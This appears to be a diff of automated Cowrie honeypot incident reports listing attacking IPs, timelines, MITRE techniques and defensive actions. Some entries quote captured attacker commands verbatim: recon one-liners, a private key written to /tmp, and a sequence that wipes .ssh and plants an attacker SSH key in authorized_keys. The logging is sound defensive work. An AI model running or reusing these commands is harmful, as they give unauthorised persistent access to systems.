+| `2026-08-22 16:25:35` | `cowrie.login.success` |
+| `2026-08-22 16:25:36` | `cowrie.session.closed` |
 
 **Recommended Actions:**
-- [ ] Submit `196.196.150[.]99` to AbuseIPDB if not already reported
-- [ ] Block `196.196.150[.]99` at perimeter firewall / security group
+- [ ] Submit `41.63.63[.]211` to AbuseIPDB if not already reported
+- [ ] Block `41.63.63[.]211` at perimeter firewall / security group
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-1020152ce838
+### 🔴 HIGH · IR-c57c96e25cbe
 
 | Field | Detail |
 |---|---|
-| **Source IP** | `196.196.150[.]99` |
-| **First Seen** | 2026-08-22 13:45 |
-| **Last Seen** | 2026-08-22 13:45 |
-| **Session Duration** | 0s |
+| **Source IP** | `130.12.180[.]51` |
+| **First Seen** | 2026-08-22 16:25 |
+| **Last Seen** | 2026-08-22 16:25 |
+| **Session Duration** | 2s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 · T1592 |
+| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
+| **Download Attempts** | ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e, 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca |
+| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
+| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |
 
 **Attack Timeline:**
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-08-22 13:45:33` | `cowrie.session.connect` |
-| `2026-08-22 13:45:33` | `cowrie.client.version` |
-| `2026-08-22 13:45:33` | `cowrie.client.kex` |
-| `2026-08-22 13:45:34` | `cowrie.login.success` |
-| `2026-08-22 13:45:34` | `cowrie.session.closed` |
+| `2026-08-22 16:25:36` | `cowrie.session.connect` |
+| `2026-08-22 16:25:36` | `cowrie.client.version` |
+| `2026-08-22 16:25:36` | `cowrie.client.kex` |
+| `2026-08-22 16:25:36` | `cowrie.login.success` |
+| `2026-08-22 16:25:38` | `cowrie.session.params` |
+| `2026-08-22 16:25:38` | `cowrie.command.input` |
+| `2026-08-22 16:25:38` | `cowrie.session.file_download` |
+| `2026-08-22 16:25:38` | `cowrie.session.file_download` |
+| `2026-08-22 16:25:38` | `cowrie.log.closed` |
+| `2026-08-22 16:25:38` | `cowrie.session.closed` |
 
 **Recommended Actions:**
-- [ ] Submit `196.196.150[.]99` to AbuseIPDB if not already reported
-- [ ] Block `196.196.150[.]99` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-3f64d3d82db4
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 13:46 |
-| **Last Seen** | 2026-08-22 13:46 |
-| **Session Duration** | 4s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:46:19` | `cowrie.session.connect` |
-| `2026-08-22 13:46:19` | `cowrie.client.version` |
-| `2026-08-22 13:46:19` | `cowrie.client.kex` |
-| `2026-08-22 13:46:21` | `cowrie.login.success` |
-| `2026-08-22 13:46:22` | `cowrie.session.params` |
-| `2026-08-22 13:46:22` | `cowrie.command.input` |
-| `2026-08-22 13:46:22` | `cowrie.command.input` |
-| `2026-08-22 13:46:22` | `cowrie.command.input` |
-| `2026-08-22 13:46:22` | `cowrie.command.input` |
-| `2026-08-22 13:46:22` | `cowrie.command.input` |
-| `2026-08-22 13:46:22` | `cowrie.command.success` |
-| `2026-08-22 13:46:22` | `cowrie.command.input` |
-| `2026-08-22 13:46:22` | `cowrie.command.input` |
-| `2026-08-22 13:46:22` | `cowrie.command.input` |
-| `2026-08-22 13:46:22` | `cowrie.command.input` |
-| `2026-08-22 13:46:23` | `cowrie.log.closed` |
-| `2026-08-22 13:46:24` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-4aa32a630f8b
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `43.165.178[.]246` |
-| **First Seen** | 2026-08-22 13:47 |
-| **Last Seen** | 2026-08-22 13:47 |
-| **Session Duration** | 5s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
-| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
-| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:47:06` | `cowrie.session.connect` |
-| `2026-08-22 13:47:06` | `cowrie.client.version` |
-| `2026-08-22 13:47:06` | `cowrie.client.kex` |
-| `2026-08-22 13:47:07` | `cowrie.login.success` |
-| `2026-08-22 13:47:08` | `cowrie.session.params` |
-| `2026-08-22 13:47:08` | `cowrie.command.input` |
-| `2026-08-22 13:47:08` | `cowrie.command.failed` |
-| `2026-08-22 13:47:08` | `cowrie.log.closed` |
-| `2026-08-22 13:47:09` | `cowrie.session.params` |
-| `2026-08-22 13:47:09` | `cowrie.command.input` |
-| `2026-08-22 13:47:09` | `cowrie.session.file_download` |
-| `2026-08-22 13:47:09` | `cowrie.log.closed` |
-| `2026-08-22 13:47:11` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `43.165.178[.]246` to AbuseIPDB if not already reported
-- [ ] Block `43.165.178[.]246` at perimeter firewall / security group
+- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
+- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
 - [ ] Review commands for lateral movement indicators
 - [ ] Submit download hash(es) to VirusTotal
-- [ ] Run Tool 31 malware analyzer on captured payload(s)
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-74ce131759c1
+### 🔴 HIGH · IR-38bf62b149d2
 
 | Field | Detail |
 |---|---|
-| **Source IP** | `43.165.178[.]246` |
-| **First Seen** | 2026-08-22 13:47 |
-| **Last Seen** | 2026-08-22 13:47 |
+| **Source IP** | `217.60.255[.]130` |
+| **First Seen** | 2026-08-22 16:30 |
+| **Last Seen** | 2026-08-22 16:30 |
 | **Session Duration** | 1s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
 | **TTPs (MITRE)** | T1078 · T1592 |
 
 **Attack Timeline:**
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-08-22 13:47:09` | `cowrie.session.connect` |
-| `2026-08-22 13:47:09` | `cowrie.client.version` |
-| `2026-08-22 13:47:09` | `cowrie.client.kex` |
-| `2026-08-22 13:47:10` | `cowrie.login.success` |
-| `2026-08-22 13:47:10` | `cowrie.session.closed` |
+| `2026-08-22 16:30:00` | `cowrie.session.connect` |
+| `2026-08-22 16:30:00` | `cowrie.client.version` |
+| `2026-08-22 16:30:00` | `cowrie.client.kex` |
+| `2026-08-22 16:30:01` | `cowrie.login.success` |
+| `2026-08-22 16:30:01` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 16:30:01` | `cowrie.direct-tcpip.ja4h` |
+| `2026-08-22 16:30:01` | `cowrie.direct-tcpip.data` |
+| `2026-08-22 16:30:02` | `cowrie.session.closed` |
 
 **Recommended Actions:**
-- [ ] Submit `43.165.178[.]246` to AbuseIPDB if not already reported
-- [ ] Block `43.165.178[.]246` at perimeter firewall / security group
+- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
+- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-2141eaf74c5d
+### 🔴 HIGH · IR-8639a3ffba11
 
 | Field | Detail |
 |---|---|
-| **Source IP** | `43.165.178[.]246` |
-| **First Seen** | 2026-08-22 13:47 |
-| **Last Seen** | 2026-08-22 13:47 |
+| **Source IP** | `217.60.255[.]130` |
+| **First Seen** | 2026-08-22 16:30 |
+| **Last Seen** | 2026-08-22 16:30 |
 | **Session Duration** | 1s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
 | **TTPs (MITRE)** | T1078 · T1592 |
 
 **Attack Timeline:**
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-08-22 13:47:10` | `cowrie.session.connect` |
-| `2026-08-22 13:47:10` | `cowrie.client.version` |
-| `2026-08-22 13:47:10` | `cowrie.client.kex` |
-| `2026-08-22 13:47:11` | `cowrie.login.success` |
-| `2026-08-22 13:47:11` | `cowrie.session.closed` |
+| `2026-08-22 16:30:05` | `cowrie.session.connect` |
+| `2026-08-22 16:30:05` | `cowrie.client.version` |
+| `2026-08-22 16:30:06` | `cowrie.client.kex` |
+| `2026-08-22 16:30:06` | `cowrie.login.success` |
+| `2026-08-22 16:30:07` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 16:30:07` | `cowrie.direct-tcpip.ja4h` |
+| `2026-08-22 16:30:07` | `cowrie.direct-tcpip.data` |
+| `2026-08-22 16:30:07` | `cowrie.session.closed` |
 
 **Recommended Actions:**
-- [ ] Submit `43.165.178[.]246` to AbuseIPDB if not already reported
-- [ ] Block `43.165.178[.]246` at perimeter firewall / security group
+- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
+- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-d37cf7656ac8
+### 🔴 HIGH · IR-ba178dbdc014
 
 | Field | Detail |
 |---|---|
-| **Source IP** | `59.11.202[.]38` |
-| **First Seen** | 2026-08-22 13:47 |
-| **Last Seen** | 2026-08-22 13:47 |
+| **Source IP** | `101.13.1[.]58` |
+| **First Seen** | 2026-08-22 16:31 |
+| **Last Seen** | 2026-08-22 16:31 |
+| **Session Duration** | 8s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 16:31:04` | `cowrie.session.connect` |
+| `2026-08-22 16:31:05` | `cowrie.client.version` |
+| `2026-08-22 16:31:05` | `cowrie.client.kex` |
+| `2026-08-22 16:31:07` | `cowrie.login.success` |
+| `2026-08-22 16:31:08` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 16:31:13` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `101.13.1[.]58` to AbuseIPDB if not already reported
+- [ ] Block `101.13.1[.]58` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-c43756f150aa
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `185.246.217[.]106` |
+| **First Seen** | 2026-08-22 16:34 |
+| **Last Seen** | 2026-08-22 16:35 |
+| **Session Duration** | 6s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 16:34:54` | `cowrie.session.connect` |
+| `2026-08-22 16:34:54` | `cowrie.client.version` |
+| `2026-08-22 16:34:54` | `cowrie.client.kex` |
+| `2026-08-22 16:34:56` | `cowrie.login.success` |
+| `2026-08-22 16:34:56` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 16:35:01` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `185.246.217[.]106` to AbuseIPDB if not already reported
+- [ ] Block `185.246.217[.]106` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-ecfff976c518
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `182.75.234[.]236` |
+| **First Seen** | 2026-08-22 16:35 |
+| **Last Seen** | 2026-08-22 16:35 |
+| **Session Duration** | 8s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 16:35:01` | `cowrie.session.connect` |
+| `2026-08-22 16:35:02` | `cowrie.client.version` |
+| `2026-08-22 16:35:02` | `cowrie.client.kex` |
+| `2026-08-22 16:35:04` | `cowrie.login.success` |
+| `2026-08-22 16:35:05` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 16:35:09` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `182.75.234[.]236` to AbuseIPDB if not already reported
+- [ ] Block `182.75.234[.]236` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-5c3f762c6a07
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `210.195.205[.]7` |
+| **First Seen** | 2026-08-22 16:39 |
+| **Last Seen** | 2026-08-22 16:40 |
+| **Session Duration** | 10s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 16:39:50` | `cowrie.session.connect` |
+| `2026-08-22 16:39:52` | `cowrie.client.version` |
+| `2026-08-22 16:39:52` | `cowrie.client.kex` |
+| `2026-08-22 16:39:55` | `cowrie.login.success` |
+| `2026-08-22 16:39:56` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 16:40:01` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `210.195.205[.]7` to AbuseIPDB if not already reported
+- [ ] Block `210.195.205[.]7` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-fb7204f06f6e
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `217.60.255[.]130` |
+| **First Seen** | 2026-08-22 16:40 |
+| **Last Seen** | 2026-08-22 16:40 |
+| **Session Duration** | 1s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 16:40:06` | `cowrie.session.connect` |
+| `2026-08-22 16:40:06` | `cowrie.client.version` |
+| `2026-08-22 16:40:06` | `cowrie.client.kex` |
+| `2026-08-22 16:40:07` | `cowrie.login.success` |
+| `2026-08-22 16:40:07` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 16:40:07` | `cowrie.direct-tcpip.ja4h` |
+| `2026-08-22 16:40:07` | `cowrie.direct-tcpip.data` |
+| `2026-08-22 16:40:08` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
+- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-a61af700cb81
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `217.60.255[.]130` |
+| **First Seen** | 2026-08-22 16:40 |
+| **Last Seen** | 2026-08-22 16:40 |
+| **Session Duration** | 1s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 16:40:10` | `cowrie.session.connect` |
+| `2026-08-22 16:40:10` | `cowrie.client.version` |
+| `2026-08-22 16:40:10` | `cowrie.client.kex` |
+| `2026-08-22 16:40:11` | `cowrie.login.success` |
+| `2026-08-22 16:40:11` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 16:40:11` | `cowrie.direct-tcpip.ja4h` |
+| `2026-08-22 16:40:11` | `cowrie.direct-tcpip.data` |
+| `2026-08-22 16:40:11` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
+- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-9934f971a6d7
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `165.99.71[.]193` |
+| **First Seen** | 2026-08-22 16:47 |
+| **Last Seen** | 2026-08-22 16:48 |
+| **Session Duration** | 7s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 16:47:59` | `cowrie.session.connect` |
+| `2026-08-22 16:47:59` | `cowrie.client.version` |
+| `2026-08-22 16:47:59` | `cowrie.client.kex` |
+| `2026-08-22 16:48:01` | `cowrie.login.success` |
+| `2026-08-22 16:48:02` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 16:48:06` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `165.99.71[.]193` to AbuseIPDB if not already reported
+- [ ] Block `165.99.71[.]193` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-984c452b601f
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `121.99.190[.]167` |
+| **First Seen** | 2026-08-22 16:48 |
+| **Last Seen** | 2026-08-22 16:48 |
 | **Session Duration** | 9s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
@@ -2715,3327 +4699,27 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-08-22 13:47:38` | `cowrie.session.connect` |
-| `2026-08-22 13:47:39` | `cowrie.client.version` |
-| `2026-08-22 13:47:39` | `cowrie.client.kex` |
-| `2026-08-22 13:47:41` | `cowrie.login.success` |
-| `2026-08-22 13:47:42` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 13:47:47` | `cowrie.session.closed` |
+| `2026-08-22 16:48:07` | `cowrie.session.connect` |
+| `2026-08-22 16:48:08` | `cowrie.client.version` |
+| `2026-08-22 16:48:08` | `cowrie.client.kex` |
+| `2026-08-22 16:48:11` | `cowrie.login.success` |
+| `2026-08-22 16:48:11` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 16:48:16` | `cowrie.session.closed` |
 
 **Recommended Actions:**
-- [ ] Submit `59.11.202[.]38` to AbuseIPDB if not already reported
-- [ ] Block `59.11.202[.]38` at perimeter firewall / security group
+- [ ] Submit `121.99.190[.]167` to AbuseIPDB if not already reported
+- [ ] Block `121.99.190[.]167` at perimeter firewall / security group
 - [ ] Investigate TCP tunnel target — port forwarding via honeypot
 - [ ] Confirm tunnel target is not internal infrastructure
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-5b5f6607797a
+### 🔴 HIGH · IR-0e010ce67237
 
 | Field | Detail |
 |---|---|
-| **Source IP** | `95.85.224[.]75` |
-| **First Seen** | 2026-08-22 13:47 |
-| **Last Seen** | 2026-08-22 13:47 |
-| **Session Duration** | 6s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:47:47` | `cowrie.session.connect` |
-| `2026-08-22 13:47:48` | `cowrie.client.version` |
-| `2026-08-22 13:47:48` | `cowrie.client.kex` |
-| `2026-08-22 13:47:49` | `cowrie.login.success` |
-| `2026-08-22 13:47:49` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 13:47:54` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `95.85.224[.]75` to AbuseIPDB if not already reported
-- [ ] Block `95.85.224[.]75` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-14f382151b10
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 13:47 |
-| **Last Seen** | 2026-08-22 13:47 |
-| **Session Duration** | 3s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:47:51` | `cowrie.session.connect` |
-| `2026-08-22 13:47:51` | `cowrie.client.version` |
-| `2026-08-22 13:47:51` | `cowrie.client.kex` |
-| `2026-08-22 13:47:52` | `cowrie.login.success` |
-| `2026-08-22 13:47:54` | `cowrie.session.params` |
-| `2026-08-22 13:47:54` | `cowrie.command.input` |
-| `2026-08-22 13:47:54` | `cowrie.command.input` |
-| `2026-08-22 13:47:54` | `cowrie.command.input` |
-| `2026-08-22 13:47:54` | `cowrie.command.input` |
-| `2026-08-22 13:47:54` | `cowrie.command.input` |
-| `2026-08-22 13:47:54` | `cowrie.command.success` |
-| `2026-08-22 13:47:54` | `cowrie.command.input` |
-| `2026-08-22 13:47:54` | `cowrie.command.input` |
-| `2026-08-22 13:47:54` | `cowrie.command.input` |
-| `2026-08-22 13:47:54` | `cowrie.command.input` |
-| `2026-08-22 13:47:54` | `cowrie.log.closed` |
-| `2026-08-22 13:47:54` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-120396ccca91
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `217.60.255[.]130` |
-| **First Seen** | 2026-08-22 13:48 |
-| **Last Seen** | 2026-08-22 13:48 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:48:00` | `cowrie.session.connect` |
-| `2026-08-22 13:48:00` | `cowrie.client.version` |
-| `2026-08-22 13:48:00` | `cowrie.client.kex` |
-| `2026-08-22 13:48:01` | `cowrie.login.success` |
-| `2026-08-22 13:48:01` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 13:48:01` | `cowrie.direct-tcpip.ja4h` |
-| `2026-08-22 13:48:01` | `cowrie.direct-tcpip.data` |
-| `2026-08-22 13:48:02` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
-- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-1612c798ff56
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `217.60.255[.]130` |
-| **First Seen** | 2026-08-22 13:48 |
-| **Last Seen** | 2026-08-22 13:48 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:48:04` | `cowrie.session.connect` |
-| `2026-08-22 13:48:04` | `cowrie.client.version` |
-| `2026-08-22 13:48:04` | `cowrie.client.kex` |
-| `2026-08-22 13:48:05` | `cowrie.login.success` |
-| `2026-08-22 13:48:05` | `cowrie.direct-tcpip.request` |
